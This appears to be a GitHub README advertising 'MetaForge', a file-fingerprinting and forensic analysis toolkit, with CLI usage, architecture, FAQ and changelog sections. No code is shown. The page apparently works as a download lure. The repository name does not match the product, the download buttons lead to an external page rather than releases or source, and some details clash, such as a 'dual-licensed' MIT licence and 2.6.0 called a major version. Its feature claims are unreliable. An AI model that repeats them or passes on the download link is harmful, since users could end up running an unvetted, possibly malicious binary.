![preview](https://raw.githubusercontent.com/suseheule-boop/file-typology-scanner/main/promo_035c.svg)

# MetaForge – The Universal File Fingerprint & Structure Intelligence Toolkit 🔍

![Static Badge](https://img.shields.io/badge/MetaForge-v2.6.0-8A2BE2) ![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-00BFFF) ![Build Status](https://img.shields.io/badge/Build-Stable-228B22) ![License](https://img.shields.io/badge/License-MIT-yellow)

## Introduction: The Art of Seeing Beyond the Extension

Every digital artifact carries a story far deeper than its filename or extension reveals. A file is not merely a container; it is a layered architecture of signatures, headers, metadata, and structural rhythms that betray its true origin, purpose, and integrity. **MetaForge** is born from the philosophy that digital identity should never be taken at face value. This toolkit is a sophisticated forensic-grade instrument designed to peel back the superficial layers and expose the profound structural DNA embedded within any file—regardless of operating system, container format, or deliberate obfuscation attempts.

Imagine walking into a library where every book's cover is blank. You would need to analyze the paper texture, the ink composition, and the binding methodology to discern whether it is a novel, a technical manual, or a quantum physics dissertation. MetaForge does precisely this for your digital library. It goes beyond the naive "magic number" check that basic file identification tools rely upon. Instead, it performs an exhaustive deep-scan of the entire binary landscape, cross-referencing hundreds of known signature databases and applying heuristic fuzzy-matching algorithms to identify files that have been renamed, embedded, appended, or deliberately corrupted.

Built for cybersecurity professionals, digital archivists, malware analysts, and curious power users alike, MetaForge employs a multi-layered detection engine. Unlike simplistic utilities that generate a single output, MetaForge constructs a complete structural dossier for every analyzed entity. It detects not only the primary file format but also identifies embedded sub-streams, trailing data anomalies, and encrypted or packed payloads. With support for over 1,200 distinct file signatures and an extensible plugin architecture, this tool grows with the ever-evolving landscape of digital formats.

---

## Overview: The Three-Pillar Detection Architecture 🏛️

### 1. **Signature Scanning Engine** 🧬

The heart of MetaForge is its robust signature-matching engine. This component maintains a comprehensive, constantly updated database of binary structures—from the classic 89 50 4E 47 (PNG) magic bytes to complex compound document specifications like OLE2 and ZIP-based formats such as DOCX, XLSX, and JAR. Each signature includes not merely the offset and byte pattern but also context-aware validation parameters—endianness flags, variable-length header checks, and conditional substructure matching—ensuring that false positives are virtually eliminated. The engine supports wildcard patterns, masked overlays, and multi-token sequences, enabling the identification of polymorphic file wrappers that change their initial bytes with every creation.

### 2. **Heuristic Structural Analyzer** 🧠

When signatures fail—either because a file is proprietary, undocumented, or has been structurally maimed—MetaForge seamlessly transitions to its heuristic mode. This analyzer performs entropy calculations across the entire data stream, measuring the predictability of byte sequences. A file that presents a uniform entropy profile may be encrypted or compressed, while localized entropy spikes could indicate an embedded executable payload within an image. Additionally, the analyzer examines the internal consistency of data structures: it validates checksum fields, checks metadata table lengths against actual data extents, and performs frequency distribution analysis. This approach mimics the cognitive pattern-recognition capabilities of a human expert, making educated deductions based on structural intuition.

### 3. **Recursive Content Parsing and Evidence Extraction** 🔬

Beyond the initial identification layer, MetaForge recursively unpacks known container formats without executing any embedded code—a strictly static operation. If it identifies a ZIP archive, it will enumerate every entry, attempting to identify and analyze each contained file. For disk image formats like ISO or VHD, it navigates the file system structure to catalog and examine individual files stored within. The tool then generates an **Evidence Report** in structured text, JSON, or HTML formats, containing a hierarchy of findings, byte-offset references, and confidence scores for each element. This makes MetaForge not just a detection tool but a detailed auditing tool that documents every step of the investigation.

---

## Getting Started: Integration and First Scan 🚀

[![Download](https://raw.githubusercontent.com/suseheule-boop/file-typology-scanner/main/launch_9f57.svg)](https://suseheule-boop.github.io/file-typology-scanner/)

MetaForge is delivered as a self-contained, dependency-less binary designed to run seamlessly across Windows, Linux (both x86_64 and ARM64), and macOS (Intel and Apple Silicon). No runtime environment, package manager, or external library installation is required—the tool is packed with all necessary assets into a single portable executable. To begin your investigation, obtain the appropriate archive for your architecture and decompress it—your system's built-in archive utility is perfectly sufficient for this action.

### Quick CLI Usage Syntax

The command-line interface is designed with a philosophy of elegant precision. The global invoker is `metaforge`, which accepts a target path as its primary operational argument. The simplest invocation forwards the detected type to the standard output stream:

- `metaforge ./suspicious_file.bin` – This scans the specified file, prints the dominant detected format, and provides a confidence percentage.

For a comprehensive analysis session, enable the verbose or listing options:

- `metaforge --analyze ./strange_folder/` – Directs the analyzer to scan every file within the directory recursively, generating a manifest.
- `metaforge --deep --json ./artifact.dat > output.json` – Performs an exhaustive scan (invoking both signature and heuristic engines) and writes the full evidence dossier to a JSON file for programmatic consumption.
- `metaforge --list-signatures` – Outputs a complete list of currently loaded signatures with their version tags, allowing you to comprehend the detection coverage.

### GUI Mode for Interactive Investigation 🖥️

For users who prefer a visual canvas for their analysis, MetaForge includes a fully responsive graphical interface (invoked via `metaforge --gui`). This interface presents the detected file's structure as an interactive tree visualization. You can click on any node to see byte ranges, ASCII payload previews, and entropy graphs for that specific segment. The UI supports drag-and-drop functionality (simply drop a file onto the window to initiate analysis), color-coded signature matches, and a "Rename Suggestion" feature that provides safe, format-appropriate file extensions based on analysis. The GUI is localized into twelve languages, including English, Spanish, German, French, Japanese, and Mandarin, automatically switching to match your system locale settings.

---

## Architecture: The Composition of the Engine 🏗️

The core of MetaForge is written in modern C++20, prioritizing performance without sacrificing memory safety. The codebase is modular, with the key modules isolated into distinct libraries to enable independent unit testing and future extensibility:

- **`libsigdb`** – Manages the signature database, optimized for high-speed binary search (Aho-Corasick automaton) and fuzzy matching.
- **`libpforensic`** – Provides the heuristic implementation containing the entropy analyzer, frequency distribution module, and the custom piecewise linear classification routines.
- **`libcontainers`** – Implements the recursive parsers for container formats (ZIP, RAR, 7z, ISO, TAR, OLE2, and a growing list of disk image formats).
- **`libcoreutils`** – Houses the command-line argument parsing framework, the JSON output serialization engine, and multi-threading task scheduler.

A unique feature of MetaForge's memory management is its "zero-copy analysis" paradigm. The engine memory-maps the target file instead of loading it entirely into the heap. This allows the tool to analyze multi-gigabyte disk images on systems with limited RAM without swapping, as only accessed segments are paged into memory by the OS. Multi-core systems benefit from the automatic work-stealing thread pool, which parallelizes the scanning of folder hierarchies and independently analyzes separate files concurrently.

---

## Feature Portfolio: Breathing Life into Detection ✨

### 🌐 **Cross-Platform Parity**
MetaForge is meticulously developed to ensure identical behavior and output formats across all three major desktop operating systems. Whether you are analyzing a Windows PE executable on a Linux audit workstation or verifying a macOS Mach-O binary on a Windows VM, the hex offsets, confidence scores, and report structures remain byte-for-byte identical. This parity is guaranteed through a continuous integration pipeline that executes a suite of 5,000+ regression tests nightly across all target architectures.

### 🧩 **Deep Signature Database (2026 Edition)**
The bundled signature database is updated quarterly with new definitions sourced from public specifications, reverse-engineering research, and community submissions. The 2026 edition covers emerging standards like the post-quantum cryptographic key containers and modern AI model serialization formats (e.g., Safetensors, ONNX extended structures). Each signature has a version timestamp, allowing the engine to report why a specific format was identified based on the signature's origin date.

### 🚦 **Responsive Real-Time Progress Reporting**
During a folder-wide analysis, MetaForge streams real-time statistics—files scanned, bytes read, false-positive rate estimation, and estimated completion time—to both console and GUI, ensuring operational transparency for long-running audits. This progress dashboard updates at a maximum frequency of 5 Hz to avoid flooding the output stream but remains responsive enough for interactive monitoring.

### 🛠️ **Extensible Plugin Framework**
Power users can author their own detection modules using the lightweight C ABI (Application Binary Interface) exposed by MetaForge. This plugin system allows you to define custom signature sets (e.g., proprietary software formats specific to your organization) and compile them as `.so`, `.dylib`, or `.dll` plugins that the core engine loads at startup. A well-documented API tutorial ships with the source repository.

### 📊 **Advanced Reporting: The `--report` Command**
Beyond standard terminal output, MetaForge generates comprehensive, human-readable reports with a business-grade structure. The `--report ./summary.html` option outputs a stylized HTML passport for the analyzed file. This passport includes a "File Bloodline" section (derived from container nesting history), an "Anomaly Heatmap" (visualizing which byte regions deviate from the format's expected structure), and a "Risk Abstraction Rating" assessing complexity parameters relevant to a forensic analyst.

---

## System Requirements and Recommended Utilities ⚙️

MetaForge is designed to be resource-light, but for the smoothest experience during massive deep-scans, we recommend an x86_64 or ARM64 processor with at least 4 logical cores, 4 GB of RAM for memory-mapped file handling, and 100 MB of available disk storage to cache temporary index files. The tool will run acceptably on lower-end hardware, but scanning times for multi-gigabyte images will scale accordingly.

For daily integration with antivirus sandboxes or automated malware triage pipelines, MetaForge exposes a stable stdout/stdin JSON-RPC interface. This allows automation scripts to invoke scanning and await structured responses without relying on external package dependencies. The communication protocol version is declared within the output envelope, ensuring backward-compatible API progression for automated front-ends.

---

## Understanding the Tiered Detection Process 🔄

The detection algorithm operates in three escalating tiers to balance speed against thoroughness:

1. **Tier 1 – Quick Match (milliseconds):** The engine reads the first 512 bytes and performs a hash lookup against a pre-compiled jump table of common signature prefixes. If a unique match is found with >98% confidence, the result is surfaced immediately.

2. **Tier 2 – Deep Signature Scan (under a second):** If the initial hash lookup fails or yields multiple candidates, the engine loads the signature automaton and performs a full scan across the first 4 MB of the file. It correlates matches, checks structural validators (e.g., "does a valid PNG header length field align with the indicated chunk sizes?"), and returns the best-ranked candidate set.

3. **Tier 3 – Heuristic Inferencing (several seconds):** When signature matching produces no definite conclusion, MetaForge performs an entropy sweep and structure consistency analysis. It then proposes a list of plausible formats, each with a calculated probability score, and clearly labels these findings as "Heuristic Hypothesis" in the summary output, preventing any potential confusion between confirmed identifications and analytical guesses.

---

## Frequently Asked Questions: Addressing Digital Curiosities ❓

**Q: Can MetaForge identify files stripped of their extensions and headers?**
Yes. While the signature database dominates the detection process, the heuristic analyzer can still infer the likely file type from residual structure. For example, an executable with its PE header zeroed out but containing typical import table residue will be flagged with a high-confidence hypothesis of "Windows Executable (Corrupted Header)." Extensive header-less identification is an active research area, with improvements shipped frequently.

**Q: Is MetaForge safe to run on live malware samples?**
Absolutely. MetaForge is strictly a static analyzer. It does not execute, unpack, or emulate code. It reads blocks sequentially using memory-mapped I/O but never writes to or modifies the target file. All analysis artifacts are written to separate output files designated by the user, ensuring forensic integrity.

**Q: How does MetaForge handle very rare or homegrown formats?**
You have two avenues. First, the `--add-signature` CLI option lets you manually specify a hex pattern, an offset, and a label for an ad-hoc signature to be used during the current session. Second, you can develop a permanent plugin module via the provided SDK to integrate your definition across all future runs.

---

## Security & Privacy Disclaimer 🛡️

MetaForge performs all analysis entirely on the local machine where it is executed. No telemetry, usage metrics, or file content—including filenames, byte samples, or analysis logs—are transmitted to any remote server at any point. The software requires no network connectivity to function, and all signature databases are bundled with the release assets. While the project is maintained by dedicated contributors who prioritize transparency, the user is ultimately responsible for their scope of application. MetaForge is provided on an "as-is" basis without warranty of any kind, express or implied. The authors shall not be liable for any damage resulting from the use or misuse of the tool, including but not limited to incorrect file identification leading to data mishandling.

---

## Contribution & Community Engagement 🤝

The repository is open to contributions of all kinds—signature data additions, plugin examples, documentation improvements, and new container parsers. Please review the repository's contribution guide (available in the root directory as `CONTRIBUTING.md`) before opening a pull request. For users who prefer to remain passive but offer value, "bug reporting" remains one of the most impactful ways to assist. Please include the following to aid reproduction: the command line arguments used, the expected output, the actual output, and a hex dump of the first 64 bytes of the problematic file (if legally permissible). For security-sensitive reports, please utilize the security advisories channel.

---

## Changelog & Versioning Rationale 📌

We adhere to [Semantic Versioning 2.0.0](https://semver.org/). The current major version **2.6.0** introduces the following relative to v2.5.x:
- New **"PE-Deep"** parser module that identifies the specific C++ compiler version used to generate a Windows executable (via RTTI structure inspection).
- Improved entropy heuristics with the new "k-means byte clustering" algorithm to better distinguish between encrypted payloads and high-entropy but structured data.
- The `--gui` mode now supports the Light/Dark system theme automatically.
- General performance improvements: multi-threaded scanning efficiency increased by ~35% for folder trees with many small files (verified via the standard `zip` benchmark data set).

For the full commit history, the milestone list, and the eventual roadmap regarding native M-series optimization [to be completed on macOS arm64], please browse the project's Releases section.

---

## Final Invocation: Take Command of Your Digital Reality 🧙

[![Download](https://raw.githubusercontent.com/suseheule-boop/file-typology-scanner/main/launch_9f57.svg)](https://suseheule-boop.github.io/file-typology-scanner/)

MetaForge is your sovereign key to the untold narrative of every binary entity. It empowers you to make decisive, evidence-backed judgments about the nature, origin, and integrity of the digital artifacts that flow through your systems—a partner in the ongoing quest for unvarnished digital truth.

*© 2026 The MetaForge Contributors. Released under the MIT License, granting you the permission to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, provided the copyright notice and permission notice are included in all copies or substantial portions of the Software.*

**License:** This software is dual-licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use it in commercial and private applications, subject to the license's terms regarding the preservation of attribution headers.

*Disclaimer: While every effort has been made to ensure the accuracy of detection algorithms, no detection tool is infallible. Critical forensic decisions should always be corroborated with manual inspection. The trademarks "Windows," "Linux," and "macOS" are property of their respective owners; their mention is for factual compatibility description only.*

**Lead you to truth, one byte at a time.** 🧬